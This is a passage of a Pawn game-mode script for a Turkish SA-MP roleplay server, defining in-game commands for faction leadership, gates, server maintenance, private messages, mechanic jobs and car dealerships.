				ApplyAnimation(playerid,"BOMBER","BOM_Plant_Crouch_Out", 4.0, 0, 0, 0, 0, 0, 1);
				format(szMessage, sizeof(szMessage), "*  %d gram marijuana ele geçirdin.", PlayerInfo[i][pWeedGrowth]);
				SendClientMessage(playerid, COLOR_GREY, szMessage);
				format(szMessage, sizeof(szMessage), "* %s bitki ele geçirildi.", GetPlayerNameEx(playerid), GetPlayerNameEx(i));
				ProxDetector(25.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				DestroyDynamicObject(PlayerInfo[i][pWeedObject]);
				PlayerInfo[i][pWeedObject] = 0;
				return 1;
			}
		}
		SendClientMessage(playerid, COLOR_GREY, "Ekim alanýnda deðilsin.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Devlet memuru deðilsin.");
	}
	return 1;
}

CMD:makeleader(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 8) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid, faction;
		if(sscanf(params, "ud", giveplayerid, faction)) {
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /makeleader [Oyuncu ID/Ýsim] [factionid]");
			SendClientMessage(playerid, COLOR_GRAD3, "|1 LSPD |2 FBI |3 LSFMD |4 Hitman |5 Government |6 LST |9 SA News");
			return 1;
		}

		if(giveplayerid != INVALID_PLAYER_ID) {
		    new
				ftext[30];

			if(faction == 1)
				ftext = "LSPD";
			else if(faction == 2)
				ftext = "FBI";
			else if(faction == 3)
				ftext = "LSFMD";
			else if(faction == 4)
				ftext = "Hitman Ajansý";
			else if(faction == 5)
				ftext = "Devlet";
			else if(faction == 6)
				ftext = "LST";
			else if(faction == 9)
				ftext = "SA Haberleri";
			else
				return SendClientMessage(playerid, COLOR_GREY, "Yanlýþ Faction ID.");

			PlayerInfo[giveplayerid][pLeader] = faction;
			PlayerInfo[giveplayerid][pRank] = 6;
			PlayerInfo[giveplayerid][pFaction] = faction;

			format(string, sizeof(string), " %s admin tarafýndan %s lideri yapýldýn.", GetPlayerNameEx(playerid),ftext);
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "%s admin %s adlý kiþiyi %s oluþum lideri yaptý.", GetPlayerNameEx(playerid), GetPlayerNameEx(playerid), ftext);
			Log("logs/faction.log", string);
			format(string, sizeof(string), " %s adlý kiþiyi %s oluþum sorumlusu yaptýn.", GetPlayerNameEx(giveplayerid),ftext);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			PlayerInfo[giveplayerid][pGang] = 255;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:pgate(playerid, params[])
{
	for(new idx=1; idx<MAX_GATES; idx++)
	{
		if(GateInfo[idx][gModel] && IsPlayerInRangeOfPoint(playerid, 8, GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ]))
		{
			if(strlen(GateInfo[idx][gPassword]))
			{
				if(sscanf(params, "s[256]", params)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /gate [þifre]");
				if(strcmp(params, GateInfo[idx][gPassword])) return SendClientMessage(playerid, COLOR_WHITE, "Hatalý kapý þifresi.");
				if(strcmp(params,"0") == 0) return SendClientMessage(playerid,COLOR_RED,"(( Gate þifreleri için yasaklý rakam girdiniz. ))");
				if(!GateInfo[idx][gStatus])
				{
					GateInfo[idx][gStatus] = 1;
					MoveDynamicObject(GateInfo[idx][gGate], GateInfo[idx][gOX], GateInfo[idx][gOY], GateInfo[idx][gOZ], GateInfo[idx][gSpeed]);
					SetDynamicObjectRot(GateInfo[idx][gGate], GateInfo[idx][gORX], GateInfo[idx][gORY], GateInfo[idx][gORZ]);
				}
				else
				{
					GateInfo[idx][gStatus] = 0;
					MoveDynamicObject(GateInfo[idx][gGate], GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ], GateInfo[idx][gSpeed]);
					SetDynamicObjectRot(GateInfo[idx][gGate], GateInfo[idx][gCRX], GateInfo[idx][gCRY], GateInfo[idx][gCRZ]);
				}
			}
			else
			{
				if(!GateInfo[idx][gStatus])
				{
					GateInfo[idx][gStatus] = 1;
					MoveDynamicObject(GateInfo[idx][gGate], GateInfo[idx][gOX], GateInfo[idx][gOY], GateInfo[idx][gOZ], GateInfo[idx][gSpeed]);
					SetDynamicObjectRot(GateInfo[idx][gGate], GateInfo[idx][gORX], GateInfo[idx][gORY], GateInfo[idx][gORZ]);
				}
				else
				{
					GateInfo[idx][gStatus] = 0;
					MoveDynamicObject(GateInfo[idx][gGate], GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ], GateInfo[idx][gSpeed]);
					SetDynamicObjectRot(GateInfo[idx][gGate], GateInfo[idx][gCRX], GateInfo[idx][gCRY], GateInfo[idx][gCRZ]);
				}
			}
			idx = MAX_GATES;
		}
	}
	return 1;
}

CMD:gate(playerid, params[]) {
	new
		string[128];

    if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pFaction] == 5) {
        GetPlayerPos(playerid, Positions[0][0], Positions[0][1], Positions[0][2]);
        GetDynamicObjectPos(LSPDGate, Positions[1][0], Positions[1][1], Positions[1][2]);
        GetDynamicObjectPos(LSPDGate2, Positions[4][0], Positions[4][1], Positions[4][2]);
        GetDynamicObjectPos(FBIGate1, Positions[2][0], Positions[2][1], Positions[2][2]);
        GetDynamicObjectPos(FBIGate2, Positions[3][0], Positions[3][1], Positions[3][2]);
		GetDynamicObjectPos(SAHGate1, Positions[6][0], Positions[6][1], Positions[6][2]);
        GetDynamicObjectPos(SAHGate2, Positions[5][0], Positions[5][1], Positions[5][2]);

        if(GetDistance(Positions[0][0], Positions[0][1], Positions[0][2], Positions[1][0], Positions[1][1], Positions[1][2]) < 15.0) {
            if(LSPDGateStatus == 0) {
                format(string, sizeof(string), "* %s uzaktan kumandaya basarak kapýyý açar", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                SetDynamicObjectRot(LSPDGate, 0.000000, 0, 90);
                LSPDGateStatus = 1;
            }
            else {
                LSPDGateStatus = 0;
                SetDynamicObjectRot(LSPDGate, 0.000000, 90, 90);
                format(string, sizeof(string), "* %s uzaktan kumandaya basarak kapýyý kapatýr", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            }
        }
        else if(GetDistance(Positions[0][0], Positions[0][1], Positions[0][2], Positions[4][0], Positions[4][1], Positions[4][2]) < 15.0) {
            if(LSPDGate2Status == 0) {
                format(string, sizeof(string), "* %s uzaktan kumandaya basarak kapýyý açar", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(LSPDGate2, 1588.6501464844, -1638.0750732422, 6.2343215942383, 3);
                LSPDGate2Status = 1;
            }
            else {
                format(string, sizeof(string), "* %s uzaktan kumandaya basarak kapýyý kapatýr", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(LSPDGate2, 1588.6428222656, -1638.02734375, 15.240161895752, 3);
                LSPDGate2Status = 0;
            }
        }
        else if(GetDistance(Positions[0][0], Positions[0][1], Positions[0][2], Positions[4][0], Positions[4][1], Positions[4][2]) < 15.0) {
            if(LSPDGate2Status == 0) {
                format(string, sizeof(string), "* %s uzaktan kumandaya basarak kapýyý açar", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(LSPDGate2, 313.49652099609, -1482.9189453125, 26.682577133179, 3);
                LSPDGate2Status = 1;
            }
            else {
                format(string, sizeof(string), "* %s uzaktan kumandaya basarak kapýyý kapatýr", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(LSPDGate2, 320.40628051758, -1487.9129638672, 26.900407791138, 3);
                LSPDGate2Status = 0;
            }
        }
	}

	if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pFaction] == 5) {
        if(GetDistance(Positions[0][0], Positions[0][1], Positions[0][2], Positions[2][0], Positions[2][1], Positions[2][2]) < 15.0) {
            if(FBIGate1Status == 0) {
                format(string, sizeof(string), "* %s uzaktan kumandaya basarak kapýyý açar", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(FBIGate1, 313.49652099609, -1482.9189453125, 26.682577133179, 3);
                FBIGate1Status = 1;
            }
            else {
                format(string, sizeof(string), "* %s uzaktan kumandaya basarak kapýyý kapatýr", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(FBIGate1, 320.40628051758, -1487.9129638672, 26.900407791138, 3);
                FBIGate1Status = 0;
            }
        }
        else if(GetDistance(Positions[0][0], Positions[0][1], Positions[0][2], Positions[3][0], Positions[3][1], Positions[3][2]) < 15.0) {
            if(FBIGate2Status == 0) {
                format(string, sizeof(string), "* %s uzaktan kumandaya basarak kapýyý açar", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(FBIGate2, 290.56341552734, -1547.8900146484, 27.16854095459, 3);
                FBIGate2Status = 1;
            }
            else {
                format(string, sizeof(string), "* %s uzaktan kumandaya basarak kapýyý kapatýr", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(FBIGate2, 283.96463012695, -1543.154296875, 27.167940139771, 3);
                FBIGate2Status = 0;
            }
		}
	}

	if(PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9) {
        if(GetDistance(Positions[0][0], Positions[0][1], Positions[0][2], Positions[5][0], Positions[5][1], Positions[5][2]) < 15.0) {
            if(SAHGate1Status == 0) {
                format(string, sizeof(string), "*%s uzaktan kumandaya basarak kapýyý açar", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(SAHGate1, 777.582092, -1384.870971, 7.970065, 3);
                SAHGate1Status = 1;
            }
            else {
                format(string, sizeof(string), "*%s uzaktan kumandaya basarak kapýyý kapatýr", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(SAHGate1, 777.582092, -1384.870971, 15.430068, 3);
                SAHGate1Status = 0;
            }
		}
	}
    return 1;
}
CMD:hostname(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 10)
        return SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanmaya yetkin yok.");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýnda deðilsin. Admin komutlarýna eriþmek için iþbaþý yapman gerekiyor. iþbaþý yapmak için /aduty komutunu kullan.");
			return 1;
	    }
  	SendRconCommand("hostname ~       Phoenix Roleplay      ~");
    return 1;
}

CMD:hostname1(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 10)
        return SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanmaya yetkin yok.");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýnda deðilsin. Admin komutlarýna eriþmek için iþbaþý yapman gerekiyor. iþbaþý yapmak için /aduty komutunu kullan.");
			return 1;
	    }
  	SendRconCommand("hostname ~       Phoenix Roleplay Aktif       ~");
    return 1;
}

CMD:hostname2(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 10)
        return SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanmaya yetkin yok.");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýnda deðilsin. Admin komutlarýna eriþmek için iþbaþý yapman gerekiyor. iþbaþý yapmak için /aduty komutunu kullan.");
			return 1;
	    }
  	SendRconCommand("hostname ~       Phoenix Roleplay      ~");
    return 1;
}

CMD:bakimaal(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 10)
        return SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanmaya yetkin yok.");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýnda deðilsin. Admin komutlarýna eriþmek için iþbaþý yapman gerekiyor. iþbaþý yapmak için /aduty komutunu kullan.");
			return 1;
	    }
  	SendRconCommand("hostname Phoenix Roleplay [BAKIM]");
	SendRconCommand("password 1332");
    SendClientMessageToAllEx(COLOR_LIGHTBLUE, " Sunucu bakýma alýnmýþtýr!");
    return 1;
}

CMD:bakimdancikar(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 10)
        return SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanmaya yetkin yok.");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýnda deðilsin. Admin komutlarýna eriþmek için iþbaþý yapman gerekiyor. iþbaþý yapmak için /aduty komutunu kullan.");
			return 1;
	    }
  	SendRconCommand("hostname ~ Phoenix Roleplay - TR ~");
	SendRconCommand("password 0");
    SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* Sunucu bakýmdan çýkartýlmýþtýr!");
    return 1;
}

CMD:pmkapat(playerid, params[])
{
   PlayerInfo[playerid][pmka] = 1;
   SendClientMessage(playerid,COLOR_WHITE,"PM kanalýný kapattýnýz.");
   return 1;
}

CMD:pmac(playerid, params[])
{
   PlayerInfo[playerid][pmka] = 0;
   SendClientMessage(playerid,COLOR_WHITE,"PM kanalýný açtýnýz.");
   return 1;
}

CMD:pmokumakapat(playerid, params[])
{
    pmokuma[playerid] = 0;
    return 1;
}

CMD:pmokumaac(playerid, params[])
{
    pmokuma[playerid] = 1;
    return 1;
}

CMD:pm(playerid, params[])
{
	new playerb, string[128], text[128];
	if(!gPlayerLogged[playerid]) return SendClientMessage(playerid, COLOR_GREY, "Komutlarý kullanmak için önce giriþ yapmanýz gerekmektedir.");
	if(sscanf(params, "us[128]", playerb, text)) return SendClientMessage(playerid, COLOR_WHITE, "{FFFFFF}[{FF0000}@{FFFFFF}] KULLANIM: /pm [playerid] [yaziniz]");
	if(AntiAdv(playerid, params)) return 1;
	if(!strlen(text)) return SendClientMessage(playerid, COLOR_GREY, "PM Atmak için birþeyler yazmalýsýn.");
	if(PlayerInfo[playerb][pmka] == 1) return SendClientMessage(playerid, COLOR_GREY, "Bu kiþinin PM Kanalý Kapalý!");
	if(!gPlayerLogged[playerid]) return SendClientMessage(playerid, COLOR_GREY, "Böyle bir oyuncu bulunamadý.");
	format(string, sizeof(string), "{FF0015}» %s{15FF00}(%d):{FFFF00} %s", RPN(playerb),playerb, text);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	format(string, sizeof(string), "{FF0015}« %s{15FF00}(%d):{F5DEB3} %s", RPN(playerid),playerid, text);
	SendClientMessage(playerb, COLOR_YELLOW, string);
	format(string, sizeof(string), "Gönderdin %s << %s: %s", RPN(playerid), RPN(playerb), text);
	Log("logs/pm.log", string);
	foreach(Player, i)
	{
	    if(PlayerInfo[i][pAdmin] >= 1)
	    {
	        format(string, sizeof(string), "[PMOKUMASI] %s(%d) >>> %s(%d): %s", RPN(playerid),playerid, RPN(playerb),playerb ,text);
	        SendClientMessage(i, COLOR_PURPLE, string);
	    }
	}
	return 1;
}

CMD:tamir(playerid, params[])
{
    if(PlayerInfo[playerid][pJob] == 7 || PlayerInfo[playerid][pJob2] == 7)
	{
    	new string[32 + MAX_PLAYER_NAME];
        if(IsPlayerInAnyVehicle(playerid))
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Arabanýn içindeyken araç tamir edemezsin.");
		    return 1;
		}

  		if(PlayerInfo[playerid][pMechTime] > 0)
		{
  			format(string, sizeof(string), "%d saniye beklemelisin!", PlayerInfo[playerid][pMechTime]);
     		SendClientMessage(playerid, COLOR_GRAD1,string);
     	}
		else if(GetPVarInt(playerid, "EventToken"))
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu etkinlikteyken kullanamazsýn.");
		}
  		else
		{
			new closestcar = GetClosestCar(playerid);

  			if(IsPlayerInRangeOfVehicle(playerid, closestcar, 10.0))
  			{
				if(!IsABike(closestcar) && !IsAPlane(closestcar)) {
					GetVehicleParamsEx(closestcar,engine,lights,alarm,doors,bonnet,boot,objective);
					if(bonnet == VEHICLE_PARAMS_OFF || bonnet == VEHICLE_PARAMS_UNSET)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "Aracý tamir edebilmek için kaputun açýk olmasý gerekir.");
						return 1;
					}
				}
  				PlayerInfo[playerid][pMechTime] = 60;
   				SetVehicleHealth(closestcar, 1000.0);
    			format(string, sizeof(string), "* %s aracý tamir etti.", GetPlayerNameEx(playerid));
    			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			}
			else return SendClientMessage(playerid, COLOR_GRAD1, "Herhangi bir arabaya yeterince yaklaþmadýn.");
  		}
    }
    else return SendClientMessage(playerid, COLOR_WHITE, "Tamirci deðilsiniz!");
    return 1;
}

CMD:nos(playerid, params[])
{
    if(PlayerInfo[playerid][pJob] == 7 || PlayerInfo[playerid][pJob2] == 7) {
        if(IsPlayerInAnyVehicle(playerid)) {
			if(GetPVarInt(playerid, "EventToken")) {
				return SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu etkinlikteyken kullanamazsýn.");
			}
            if(! IsPlayerInInvalidNosVehicle(playerid))
			{
   				if(GetPlayerCash(playerid) < 25)
		    	{
		        	SendClientMessage(playerid, COLOR_WHITE, "Yeterli paran yok.");
		    	    return 1;
		    	}
                new string[128];
                new nostogive;
                new level = PlayerInfo[playerid][pMechSkill];
                if(level >= 0 && level < 50) { nostogive = 1009; }
                else if(level >= 50 && level < 100) { nostogive = 1009; }
                else if(level >= 100 && level < 200) { nostogive = 1008; }
                else if(level >= 200 && level < 400) { nostogive = 1008; }
                else if(level >= 400) { nostogive = 1010; }
                AddVehicleComponent(GetPlayerVehicleID(playerid),nostogive);
                                                  //NOS
                PlayerPlaySound(playerid,1133,0.0,0.0,0.0);

                GivePlayerCash(playerid, -25);
                format(string, sizeof(string), "* %s aracýna nitro ekledi.", GetPlayerNameEx(playerid));
                ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            }
            else {
                SendClientMessage(playerid, COLOR_WHITE, "Bu araca nitro eklenemez.");
            }
        }
        else {
            SendClientMessage(playerid, COLOR_WHITE, "Araçta deðilsin.");
        }
    }
    else {
        SendClientMessage(playerid, COLOR_WHITE, "Tamirci deðilsiniz!");
    }
    return 1;
}

CMD:hidrolik(playerid, params[])
{
    if(PlayerInfo[playerid][pJob] == 7 || PlayerInfo[playerid][pJob2] == 7)
	{
        if(IsPlayerInAnyVehicle(playerid))
		{
		    if(GetPlayerCash(playerid) < 25)
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "Yeterli paran yok.");
		        return 1;
		    }
            if(! IsPlayerInInvalidNosVehicle(playerid)) {
                new string[128];
                PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
                AddVehicleComponent(GetPlayerVehicleID(playerid), 1087);
                GivePlayerCash(playerid, -25);
                format(string, sizeof(string), "* %s aracýna hidrolik ekledi.", GetPlayerNameEx(playerid));
                ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            }
            else {
                SendClientMessage(playerid, COLOR_WHITE, "Hidrolik bu araca eklenemez.");
            }
        }
        else {
            SendClientMessage(playerid, COLOR_WHITE, "Araçta deðilsin.");
        }
    }
    else {
        SendClientMessage(playerid, COLOR_WHITE, "Tamirci deðislin!");
    }
    return 1;
}


CMD:tamtamir(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 7 && PlayerInfo[playerid][pJob2] != 7)
	{
		SendClientMessage(playerid, COLOR_GREY, "   Tamirci deðilsin!");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD1, "Araç içersindeyken aracý tamir edemezsin.");

	new string[128];
	if(PlayerInfo[playerid][pMechTime] >= 1)
	{
		format(string, sizeof(string), "%d saniye beklemelisin!", PlayerInfo[playerid][pMechTime]);
		SendClientMessage(playerid, COLOR_GRAD1,string);
		return 1;
	}
	if(GetPVarInt(playerid, "EventToken")) {
		return SendClientMessage(playerid, COLOR_GRAD1, "Etkinlikteyken bu komutu kullanamazsýn.");
	}
	new giveplayerid, money;
	if(sscanf(params, "ud", giveplayerid, money)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /tamtamir [Oyuncu ID/Ýsim] [fiyat]");

	if(PlayerInfo[playerid][pTire] > 0)
	{
		if(money < 1 || money > 1000) { SendClientMessage(playerid, COLOR_GREY, "   Ücret 1-1000$ arasýnda olmalýdýr!"); return 1; }
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
			    new closestcar = GetClosestCar(playerid);

	  			if(IsPlayerInRangeOfVehicle(playerid, closestcar, 8.0))
	  			{
					if(ProxDetectorS(8.0, playerid, giveplayerid)&& IsPlayerInAnyVehicle(giveplayerid))
					{
						if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Kendi kendine tamir teklif edemezsin."); return 1; }
	                    if(!IsABike(closestcar) && !IsAPlane(closestcar))
						{
							GetVehicleParamsEx(closestcar,engine,lights,alarm,doors,bonnet,boot,objective);
							if(bonnet == VEHICLE_PARAMS_OFF || bonnet == VEHICLE_PARAMS_UNSET)
							{
								SendClientMessage(playerid, COLOR_GRAD1, "Aracýn kaputu açýk olmalýdýr.");
								return 1;
							}
						}
						format(string, sizeof(string), "* %s adlý kiþiye %d$ karþýlýðý tamir teklif ediyorsun .",GetPlayerNameEx(giveplayerid),money);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* Tamirci %s aracýný %d$ karþýlýðý tamir etmek istiyor, (örnek: /kabulet tamir).",GetPlayerNameEx(playerid),money);
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						PlayerInfo[playerid][pMechTime] = 60;
						RepairOffer[giveplayerid] = playerid;
						RepairPrice[giveplayerid] = money;
					}
					else
					{
						SendClientMessage(playerid, COLOR_GREY, "   Bu kiþi senin yakýnýnda deðil / Aracýn içersinde deðil.");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Herhangi bir aracýn yakýnýnda deðilsin.");
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   Bu kiþi oyunda deðil.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   Lastiðin yok, Zanaatkar olup lastik yapabilirsin.");
	}
	return 1;
}

CMD:tisbasi(playerid, params[])
{
    if(PlayerInfo[playerid][pJob] == 7 || PlayerInfo[playerid][pJob2] == 7)
	{
        if(JobDuty[playerid] == 1)
		{
            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Þuanda iþ baþýnda deðilsin, Artýk teklifler gelmeyecek.");
            JobDuty[playerid] = 0;
            Mechanics -= 1;
        }
        else
		{
            if(TransportDuty[playerid] != 0) return SendClientMessage(playerid,COLOR_GREY,"Öncelikle taþýmacýlýk mesleðinden çýkmalýsýn.");
            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Þuanda tamirci olarak iþ baþý yaptýnýz.Araba tamircisine ihtiyacý olan kiþiler size teklif sunabilecektir.");
            JobDuty[playerid] = 1;
            ++Mechanics;
        }
    }
    else
	{
        SendClientMessage(playerid, COLOR_GRAD1, "   Tamirci deðilsin!");
    }
    return 1;
}

CMD:aracsaticisiniduzenle(playerid, params[])
{
    for(new d = 0 ; d < MAX_CARDEALERSHIPS; d++)
	{
        if(IsPlayerInRangeOfPoint(playerid, CarDealershipInfo[d][cdRadius], CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ])) {
            if(IsPlayerOwnerOfCDEx(playerid, d))
			{
                SetPVarInt(playerid, "editingcd", d);
                SetPVarInt(playerid, "editingcdveh", -1);
                SetPVarInt(playerid, "editingcdvehpos", 0);
                SetPVarInt(playerid, "editingcdvehnew", 0);
                new listitems[] = "1 Yeni araç\n2 Benim Araçlarým\n3 Yükselt\n4 Kasa";
                ShowPlayerDialogEx(playerid,DIALOG_CDEDIT,DIALOG_STYLE_LIST,"Devam etmek için seçiniz", listitems,"Seç","Iptal");
                return 1;
            }
            else
			{
                SendClientMessage(playerid, COLOR_GREY, "Bu Araba satýcýsý sizin deðil");
                return 1;
            }
        }
    }
    SendClientMessage(playerid, COLOR_GREY, "Hata: Araba satýcýsýnýn alaný içersinde olmalýsýnýz.");
    return 1;
}

CMD:aracduzenle(playerid, params[])
{
    new vehicleid = GetPlayerVehicleID(playerid);
    new v, d;
    v = GetCarDealershipVehicleId(vehicleid);
    d = GetCarDealershipId(vehicleid);
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Hata: Herhangi bir aracýn içersinde deðilsin.");
    if(v != -1 && d != -1)
	{
        if(IsPlayerOwnerOfCDEx(playerid, d))
		{
            SetPVarInt(playerid, "editingcd", d);
            SetPVarInt(playerid, "editingcdveh", v);
            SetPVarInt(playerid, "editingcdvehpos", 0);
            SetPVarInt(playerid, "editingcdvehnew", 0);
            new listitems[] = "1 Model Ayarla\n2 Fiyat Ayarla\n3 Park ayarla\n4 Araç sil";
            ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Araba Satýcýsý:", listitems,"Seç","Iptal");
            return 1;
        }
        else
		{
            SendClientMessage(playerid, COLOR_GREY, "Hata: Bu araba satýcýsý senin deðil.");
        }
    }
    else
	{
        SendClientMessage(playerid, COLOR_GREY, "Hata: Araç bir Araba satýcýsýnda deðil.");
    }
    return 1;
}

CMD:aracsaticisial(playerid, params[])
{
    for(new d = 0 ; d < MAX_CARDEALERSHIPS; d++)
	{
        if(IsPlayerInRangeOfPoint(playerid, 3.0, CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ]))
		{
            if(!CarDealershipInfo[d][cdOwned])
			{
                if(PlayerInfo[playerid][pCash] < CarDealershipInfo[d][cdPrice])
				{
                    SendClientMessage(playerid, COLOR_GREY, " Bu araba satýcýsýný satýn alabilmek için yeterli paran yok.");
                    return 1;
                }
                PlayerInfo[playerid][pCash] -= CarDealershipInfo[d][cdPrice];
                SetPlayerOwnerOfCD(playerid, d);
                PlayerPlayMusic(playerid);
                SendClientMessage(playerid, COLOR_WHITE, " Tebrikler.");
                SendClientMessage(playerid, COLOR_WHITE, " Araba satýcýsý hakkýnda yardým almak için /yardim.");
                SendClientMessage(playerid, COLOR_GRAD1, " Lütfen satýn alýnan arabalarýn doðacaðý yeri belirle");
                SendClientMessage(playerid, COLOR_GRAD2, " Ýstediðin yere git ve bir kere Mouse 1 tuþuna bas(yumruk at).");
                SendClientMessage(playerid, COLOR_GRAD2, " Bir kere Mause 1 tuþuna basmayý unutmayýn.");
                SendClientMessage(playerid, COLOR_WHITE, " Not: Eðer sen onu göremiyorsan, müþterilerin hiçbir aracý satýn alamayacaklar.");
                SetPVarInt(playerid, "editingcdvehpos", 2);
                SetPVarInt(playerid, "editingcd", d);
                return 1;
            }
            else
			{
                SendClientMessage(playerid, COLOR_GREY, "Bu Araba satýcýsý zaten satýn alýnmýþ, Satýlýk deðil.");
            }
        }
    }
    return 1;
}

